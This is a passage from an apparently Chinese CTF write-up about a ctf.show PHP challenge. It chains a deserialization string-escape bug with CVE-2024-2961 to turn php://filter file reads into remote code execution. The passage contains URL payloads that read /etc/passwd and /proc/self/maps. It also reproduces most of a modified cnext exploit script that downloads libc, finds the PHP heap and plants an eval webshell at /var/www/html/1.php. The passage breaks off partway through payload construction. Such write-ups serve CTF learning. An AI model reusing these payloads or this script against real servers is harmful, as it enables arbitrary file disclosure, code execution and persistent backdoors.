class="string">&quot;O:9:&quot;</span>read_file<span class="string">&quot;:2:&#123;s:5:&quot;</span>start<span class="string">&quot;;s:9:&quot;</span>gxngxngxn<span class="string">&quot;;s:8:&quot;</span>filename<span class="string">&quot;;s:55:&quot;</span>php:<span class="comment">//filter/convert.base64-encode/resource=/etc/passwd&quot;;&#125;&quot;;s:8:&quot;filename&quot;;s:55:&quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>​我们可以发现，目前想办法把poc2的前38个字符逃逸掉就可以读取任意文件了，那怎么逃逸呢？我们只需要想办法把poc2的前38个字符逃逸掉就可以读取任意文件了，</p><p>​一个<code>%f0abc</code>可以后移三位，一个%9f前移一位，那我们可以计算。13*3-1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1:</span><br><span class="line">read=%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%9f&amp;start=O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:55:&quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;;&#125;</span><br></pre></td></tr></table></figure><p>第二种传参：</p><p>​这里还有一个注意点是它返回<code>$start+1</code>,所以我们需要多加一个%9f(增加逃逸)前面 126+1个%9f，还有就是start的值必须足够长(尽可能多实)，要不然截取不完</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload2:</span><br><span class="line">read=%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9fO:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:55:&quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;;&#125;&amp;start=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br></pre></td></tr></table></figure><p>到这里才哪到哪，真正的重头戏在面，（我要搞得崩溃了😅），现在我们只是能够利用file_get_contents()进行读取文件，但是我们并不知道flag文件在哪里，这里有一个CVE</p><p><strong>CVE-2024-2961：将phpfilter任意文件读取提升为远程代码执行</strong></p><p>参考:</p><p><a href="https://xz.aliyun.com/t/14690">https://xz.aliyun.com/t/14690</a></p><p>原作者给出的exp: </p><p><a href="https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py">https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> ten <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">HEAP_SIZE = <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line">BUG = <span class="string">&quot;劄&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://1e978a69-8ead-4157-8af7-839756b45872.challenge.ctf.show/&quot;</span></span><br><span class="line">command: <span class="built_in">str</span> = <span class="string">&quot;echo &#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;&gt;/var/www/html/1.php;&quot;</span></span><br><span class="line">sleep: <span class="built_in">int</span> = <span class="number">1</span></span><br><span class="line">PAD: <span class="built_in">int</span> = <span class="number">20</span></span><br><span class="line">pad: <span class="built_in">int</span> = <span class="number">20</span></span><br><span class="line">info = &#123;&#125;</span><br><span class="line">heap = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Region</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;A memory region.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    start: <span class="built_in">int</span></span><br><span class="line">    stop: <span class="built_in">int</span></span><br><span class="line">    permissions: <span class="built_in">str</span></span><br><span class="line">    path: <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">size</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">return</span> self.stop - self.start</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 /proc/self/maps</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_maps</span>():</span><br><span class="line">data = <span class="string">&#x27;?read=%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0%9f%9fa%f0%9f%9fa&amp;start=O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:59:&quot;php://filter/convert.base64-encode/resource=/proc/self/maps&quot;;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">r = requests.get(url+data).text</span><br><span class="line"><span class="comment"># print(r)</span></span><br><span class="line">data = re.search(<span class="string">&quot;What you are reading is:(.*)&quot;</span>, r).group(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># print(txt)</span></span><br><span class="line"><span class="keyword">return</span> b64decode(data)</span><br><span class="line"><span class="comment"># 获取 libc</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>(<span class="params">get_file , local_path</span>):</span><br><span class="line">filename = <span class="string">&quot;php://filter/convert.base64-encode/resource=&quot;</span>+get_file</span><br><span class="line">data = <span class="string">&#x27;?read=%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0%9f%9fa%f0%9f%9fa&amp;start=O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:[num]:&quot;[filename]&quot;;&#125;&#x27;</span></span><br><span class="line">data = data.replace(<span class="string">&#x27;[num]&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(filename)))</span><br><span class="line">data = data.replace(<span class="string">&#x27;[filename]&#x27;</span>,filename)</span><br><span class="line">r = requests.get(url + data).text</span><br><span class="line">data = re.search(<span class="string">&quot;What you are reading is:(.*)&quot;</span>, r).group(<span class="number">1</span>)</span><br><span class="line">data = b64decode(data)</span><br><span class="line"><span class="built_in">open</span>(local_path,<span class="string">&#x27;wb&#x27;</span>).write(data)</span><br><span class="line"><span class="comment"># Path(local_path).write(data)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_regions</span>():</span><br><span class="line">maps = get_maps()</span><br><span class="line">maps = maps.decode()</span><br><span class="line">PATTERN = re.<span class="built_in">compile</span>(</span><br><span class="line"><span class="string">r&quot;^([a-f0-9]+)-([a-f0-9]+)\b&quot;</span> <span class="string">r&quot;.*&quot;</span> <span class="string">r&quot;\s([-rwx]&#123;3&#125;[ps])\s&quot;</span> <span class="string">r&quot;(.*)&quot;</span></span><br><span class="line">)</span><br><span class="line">regions = []</span><br><span class="line"><span class="keyword">for</span> region <span class="keyword">in</span> table.split(maps, strip=<span class="literal">True</span>):</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">match</span> := PATTERN.<span class="keyword">match</span>(region):</span><br><span class="line">start = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>), <span class="number">16</span>)</span><br><span class="line">stop = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">2</span>), <span class="number">16</span>)</span><br><span class="line">permissions = <span class="keyword">match</span>.group(<span class="number">3</span>)</span><br><span class="line">path = <span class="keyword">match</span>.group(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;/&quot;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&quot;[&quot;</span> <span class="keyword">in</span> path:</span><br><span class="line">path = path.rsplit(<span class="string">&quot; &quot;</span>, <span class="number">1</span>)[-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">path = <span class="string">&quot;&quot;</span></span><br><span class="line">current = Region(start, stop, permissions, path)</span><br><span class="line">regions.append(current)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(maps)</span><br><span class="line"><span class="comment"># failure(&quot;Unable to parse memory mappings&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># self.log.info(f&quot;Got &#123;len(regions)&#125; memory regions&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> regions</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过 /proc/self/maps 得到 堆地址</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_main_heap</span>(<span class="params">regions: <span class="built_in">list</span>[Region]</span>) -&gt; Region:</span><br><span class="line"><span class="comment"># Any anonymous RW region with a size superior to the base heap size is a</span></span><br><span class="line"><span class="comment"># candidate. The heap is at the bottom of the region.</span></span><br><span class="line">heaps = [</span><br><span class="line">region.stop - HEAP_SIZE + <span class="number">0x40</span></span><br><span class="line"><span class="keyword">for</span> region <span class="keyword">in</span> <span class="built_in">reversed</span>(regions)</span><br><span class="line"><span class="keyword">if</span> region.permissions == <span class="string">&quot;rw-p&quot;</span></span><br><span class="line"><span class="keyword">and</span> region.size &gt;= HEAP_SIZE</span><br><span class="line"><span class="keyword">and</span> region.stop &amp; (HEAP_SIZE - <span class="number">1</span>) == <span class="number">0</span></span><br><span class="line"><span class="keyword">and</span> region.path == <span class="string">&quot;&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> heaps:</span><br><span class="line">failure(<span class="string">&quot;Unable to find PHP&#x27;s main heap in memory&quot;</span>)</span><br><span class="line"></span><br><span class="line">first = heaps[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(heaps) &gt; <span class="number">1</span>:</span><br><span class="line">heaps = <span class="string">&quot;, &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">hex</span>, heaps))</span><br><span class="line">msg_info(<span class="string">f&quot;Potential heaps: [i]<span class="subst">&#123;heaps&#125;</span>[/] (using first)&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">msg_info(<span class="string">f&quot;Using [i]<span class="subst">&#123;<span class="built_in">hex</span>(first)&#125;</span>[/] as heap&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> first</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_get_region</span>(<span class="params">regions: <span class="built_in">list</span>[Region], *names: <span class="built_in">str</span></span>) -&gt; Region:</span><br><span class="line"><span class="string">&quot;&quot;&quot;Returns the first region whose name matches one of the given names.&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> region <span class="keyword">in</span> regions:</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">any</span>(name <span class="keyword">in</span> region.path <span class="keyword">for</span> name <span class="keyword">in</span> names):</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">failure(<span class="string">&quot;Unable to locate region&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> region</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载 libc 文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_symbols_and_addresses</span>():</span><br><span class="line">regions = get_regions()</span><br><span class="line">LIBC_FILE = <span class="string">&quot;/dev/shm/cnext-libc&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP&#x27;s heap</span></span><br><span class="line"></span><br><span class="line">info[<span class="string">&quot;heap&quot;</span>] = heap <span class="keyword">or</span> find_main_heap(regions)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Libc</span></span><br><span class="line"></span><br><span class="line">libc = _get_region(regions, <span class="string">&quot;libc-&quot;</span>, <span class="string">&quot;libc.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">download_file(libc.path, LIBC_FILE)</span><br><span class="line"></span><br><span class="line">info[<span class="string">&quot;libc&quot;</span>] = ELF(LIBC_FILE, checksec=<span class="literal">False</span>)</span><br><span class="line">info[<span class="string">&quot;libc&quot;</span>].address = libc.start</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compress</span>(<span class="params">data</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns data suitable for `zlib.inflate`.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># Remove 2-byte header and 4-byte checksum</span></span><br><span class="line">    <span class="keyword">return</span> zlib.compress(data, <span class="number">9</span>)[<span class="number">2</span>:-<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b64</span>(<span class="params">data: <span class="built_in">bytes</span>, misalign=<span class="literal">True</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    payload = b64encode(data)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> misalign <span class="keyword">and</span> payload.endswith(<span class="string">&quot;=&quot;</span>):</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Misaligned: <span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compressed_bucket</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns a chunk of size 0x8000 that, when dechunked, returns the data.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> chunked_chunk(data, <span class="number">0x8000</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qpe</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Emulates quoted-printable-encode.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(<span class="string">f&quot;=<span class="subst">&#123;x:02x&#125;</span>&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> data).upper().encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ptr_bucket</span>(<span class="params">*ptrs, size=<span class="literal">None</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Creates a 0x8000 chunk that reveals pointers after every step has been ran.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> size <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(ptrs) * <span class="number">8</span> == size</span><br><span class="line">    bucket = <span class="string">b&quot;&quot;</span>.join(<span class="built_in">map</span>(p64, ptrs))</span><br><span class="line">    bucket = qpe(bucket)</span><br><span class="line">    bucket = chunked_chunk(bucket)</span><br><span class="line">    bucket = chunked_chunk(bucket)</span><br><span class="line">    bucket = chunked_chunk(bucket)</span><br><span class="line">    bucket = compressed_bucket(bucket)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bucket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chunked_chunk</span>(<span class="params">data: <span class="built_in">bytes</span>, size: <span class="built_in">int</span> = <span class="literal">None</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Constructs a chunked representation of the given chunk. If size is given, the</span></span><br><span class="line"><span class="string">    chunked representation has size `size`.</span></span><br><span class="line"><span class="string">    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># The caller does not care about the size: let&#x27;s just add 8, which is more than</span></span><br><span class="line">    <span class="comment"># enough</span></span><br><span class="line">    <span class="keyword">if</span> size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        size = <span class="built_in">len</span>(data) + <span class="number">8</span></span><br><span class="line">    keep = <span class="built_in">len</span>(data) + <span class="built_in">len</span>(<span class="string">b&quot;\n\n&quot;</span>)</span><br><span class="line">    size = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">len</span>(data):x&#125;</span>&quot;</span>.rjust(size - keep, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> size.encode() + <span class="string">b&quot;\n&quot;</span> + data + <span class="string">b&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 攻击 payload 的生成</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_exploit_path</span>() -&gt; <span class="built_in">str</span>:</span><br><span class="line">LIBC = info[<span class="string">&quot;libc&quot;</span>]</span><br><span class="line">ADDR_EMALLOC = LIBC.symbols[<span class="string">&quot;__libc_malloc&quot;</span>]</span><br><span class="line">ADDR_EFREE = LIBC.symbols[<span class="string">&quot;__libc_system&quot;</span>]</span><br><span class="line">ADDR_EREALLOC = LIBC.symbols[<span class="string">&quot;__libc_realloc&quot;</span>]</span><br><span class="line"></span><br><span class="line">ADDR_HEAP = info[<span class="string">&quot;heap&quot;</span>]</span><br><span class="line">ADDR_FREE_SLOT = ADDR_HEAP + <span class="number">0x20</span></span><br><span class="line">ADDR_CUSTOM_HEAP = ADDR_HEAP + <span class="number">0x0168</span></span><br><span class="line"></span><br><span class="line">ADDR_FAKE_BIN = ADDR_FREE_SLOT - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">CS = <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pad needs to stay at size 0x100 at every step</span></span><br><span class="line">pad_size = CS - <span class="number">0x18</span></span><br><span class="line">pad = <span class="string">b&quot;\x00&quot;</span> * pad_size</span><br><span class="line">pad = chunked_chunk(pad, <span class="built_in">len</span>(pad) + <span class="number">6</span>)</span><br><span class="line">pad = chunked_chunk(pad, <span class="built_in">len</span>(pad) + <span class="number">6</span>)</span><br><span class="line">pad = chunked_chunk(pad, <span class="built_in">len</span>(pad) + <span class="number">6</span>)</span><br><span class="line">pad = compressed_bucket(pad)</span><br><span class="line"></span><br><span class="line">step1_size = <span class="number">1</span></span><br><span class="line">step1 = <span class="string">b&quot;\x00&quot;</span> * step1_size</span><br><span class="line">step1 = chunked_chunk(step1)</span><br><span class="line">step1 = chunked_chunk(step1)</span><br><span class="line">step1 = chunked_chunk(step1, CS)</span><br><span class="line">step1 = compressed_bucket(step1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Since these chunks contain non-UTF-8 chars, we cannot let it get converted to</span></span><br><span class="line"><span class="comment"># ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk &quot;crash&quot;</span></span><br><span class="line"></span><br><span class="line">step2_size = <span class="number">0x48</span></span><br><span class="line">step2 = <span class="string">b&quot;\x00&quot;</span> * (step2_size + <span class="number">8</span>)</span><br><span class="line">step2 = chunked_chunk(step2, CS)</span><br><span class="line">step2 = chunked_chunk(step2)</span><br><span class="line">step2 = compressed_bucket(step2)</span><br><span class="line"></span><br><span class="line">step2_write_ptr = <span class="string">b&quot;0\n&quot;</span>.ljust(step2_size, <span class="string">b&quot;\x00&quot;</span>) + p64(ADDR_FAKE_BIN)</span><br><span 